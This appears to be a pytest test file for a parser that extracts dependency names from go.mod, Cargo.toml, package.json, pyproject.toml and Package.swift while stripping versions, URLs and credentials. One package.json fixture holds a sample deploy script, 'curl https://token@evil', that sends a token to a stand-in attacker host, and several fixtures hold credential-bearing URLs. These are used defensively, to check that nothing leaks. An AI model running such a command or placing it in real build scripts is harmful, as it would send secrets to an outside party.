"""Manifest facts: names only, bounded, never credentials, tolerant of malformed input."""

import json

from app.analyzers.facts.manifests import is_manifest, parse_manifest


def names(fact, scope=None):
    return [d.name for d in fact.dependencies if scope is None or d.scope == scope]


def test_go_mod_module_and_requires_without_versions():
    fact = parse_manifest(
        "go.mod",
        b"module github.com/acme/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.1\n"
        b"\tgolang.org/x/net v0.1.0 // indirect\n)\nrequire example.com/one v1.0.0\n"
        b"replace example.com/one => ../one\n",
    )
    assert fact.ecosystem == "go" and fact.name == "github.com/acme/app"
    assert names(fact) == ["example.com/one", "github.com/gin-gonic/gin", "golang.org/x/net"]
    assert "v1.9.1" not in fact.model_dump_json()


def test_cargo_package_dependencies_workspace_and_renames():
    fact = parse_manifest(
        "Cargo.toml",
        b'[package]\nname = "tool"\n[workspace]\nmembers = ["crates/a", "crates/b"]\n'
        b'[dependencies]\nserde = "1"\nfoo = { package = "real-foo", version = "1" }\n'
        b'[dev-dependencies]\ntempfile = "3"\n[[bin]]\nname = "tool-cli"\n',
    )
    assert fact.name == "tool" and fact.members == ("crates/a", "crates/b")
    assert names(fact, "runtime") == ["real-foo", "serde"] and names(fact, "dev") == ["tempfile"]
    assert fact.targets == ("tool-cli",)


def test_package_json_dependencies_scopes_and_workspaces():
    fact = parse_manifest(
        "web/package.json",
        json.dumps(
            {
                "name": "@acme/web",
                "scripts": {"deploy": "curl https://token@evil"},
                "dependencies": {"react": "^18"},
                "devDependencies": {"vitest": "1", "react": "^18"},
                "workspaces": {"packages": ["packages/*"]},
            }
        ).encode(),
    )
    assert fact.name == "@acme/web" and fact.members == ("packages/*",)
    assert names(fact, "runtime") == ["react"] and names(fact, "dev") == ["vitest"]
    assert "curl" not in fact.model_dump_json() and "token" not in fact.model_dump_json()


def test_pyproject_pep621_and_poetry():
    pep = parse_manifest(
        "pyproject.toml",
        b'[project]\nname = "pkg"\ndependencies = ["requests>=2", "pydantic[email]~=2"]\n'
        b'[project.optional-dependencies]\ndev = ["pytest>=8"]\n',
    )
    assert pep.name == "pkg"
    assert names(pep, "runtime") == ["pydantic", "requests"] and names(pep, "dev") == ["pytest"]
    poetry = parse_manifest(
        "pyproject.toml",
        b'[tool.poetry]\nname = "old"\n[tool.poetry.dependencies]\npython = "^3.9"\nflask = "^2"\n'
        b'[tool.poetry.group.dev.dependencies]\nblack = "*"\n',
    )
    assert names(poetry, "runtime") == ["flask"] and names(poetry, "dev") == ["black"]


def test_package_swift_names_without_urls_or_credentials():
    fact = parse_manifest(
        "Package.swift",
        b'let package = Package(name: "Kit", dependencies: [\n'
        b'.package(url: "https://user:pw@github.com/apple/swift-log.git", from: "1.0.0")],\n'
        b'targets: [.target(name: "Kit"), .testTarget(name: "KitTests")])\n',
    )
    assert fact.name == "Kit" and fact.targets == ("Kit", "KitTests")
    assert names(fact) == ["swift-log"]
    assert "pw" not in fact.model_dump_json() and "github" not in fact.model_dump_json()


def test_malformed_oversized_and_unknown_manifests_yield_none():
    assert parse_manifest("Cargo.toml", b"[package\nname=") is None
    assert parse_manifest("package.json", b"[1, 2]") is None
    assert parse_manifest("package.json", b"x" * (300 * 1024)) is None
    assert parse_manifest("package.json", b"\xff\xfe") is None
    assert parse_manifest("README.md", b"# hi") is None
    assert is_manifest("a/b/go.mod") and not is_manifest("a/go.sum")


def test_dependency_lists_are_bounded_and_deterministic():
    many = {f"dep{i:04d}": "1" for i in range(900)}
    a = parse_manifest("package.json", json.dumps({"dependencies": many}).encode())
    b = parse_manifest(
        "package.json", json.dumps({"dependencies": dict(reversed(many.items()))}).encode()
    )
    assert len(a.dependencies) == 512 and a.truncated and a == b


def test_hostile_and_odd_manifests_never_raise():
    assert parse_manifest("pyproject.toml", b"[project]\ndependencies = 5\n").dependencies == ()
    assert (
        parse_manifest("pyproject.toml", b'[project]\ndependencies = "requests"\n').dependencies
        == ()
    )
    assert parse_manifest("pyproject.toml", b"[project]\nname = 3\n").name is None
    assert parse_manifest("package.json", b'{"dependencies": ["a"], "workspaces": 7}') is not None
    assert parse_manifest("Cargo.toml", b"[dependencies]\nx = 5\n[target]\nfoo = 1\n") is not None


def test_byte_order_marks_and_tabs_are_tolerated():
    assert parse_manifest("package.json", b'\xef\xbb\xbf{"name": "bom"}').name == "bom"
    assert parse_manifest("Cargo.toml", b'\xef\xbb\xbf[package]\nname = "bom"\n').name == "bom"
    fact = parse_manifest(
        "go.mod", b"module\texample.com/tab\nrequire\t(\n\texample.com/dep v1\n)\n"
    )
    assert fact.name == "example.com/tab" and [d.name for d in fact.dependencies] == [
        "example.com/dep"
    ]


def test_swift_urls_keep_only_a_plain_name_and_the_scan_is_bounded():
    import time

    fact = parse_manifest(
        "Package.swift",
        b'.package(url: "https://github.com/o/r?token=abc", from: "1")\n'
        b'.package(url: "https://TOKEN@host/x/y.git", from: "1")\n',
    )
    assert [d.name for d in fact.dependencies] == ["r", "y"]  # query and credentials stripped
    assert "token" not in fact.model_dump_json() and "TOKEN" not in fact.model_dump_json()
    started = time.perf_counter()
    parse_manifest("Package.swift", b".package(" * 25000)
    assert time.perf_counter() - started < 2.0


def test_scoped_npm_names_survive_the_name_hardening():
    fact = parse_manifest(
        "package.json", b'{"name": "@acme/ui", "dependencies": {"@scope/pkg": "1"}}'
    )
    assert fact.name == "@acme/ui" and [d.name for d in fact.dependencies] == ["@scope/pkg"]


def test_digest_is_unchanged_for_facts_without_a_manifest():
    import hashlib
    from uuid import uuid4

    from app.contracts.ast_facts import FileFactsV1
    from app.domain.canonical_json import semantic_digest

    facts = FileFactsV1(
        file_id=uuid4(),
        path="a.py",
        sha256="a" * 64,
        language="python",
        grammar="g",
        status="parsed",
    )
    legacy = facts.model_dump(mode="json")
    legacy.pop("manifest")
    assert facts.facts_sha256() == semantic_digest(legacy) and hashlib
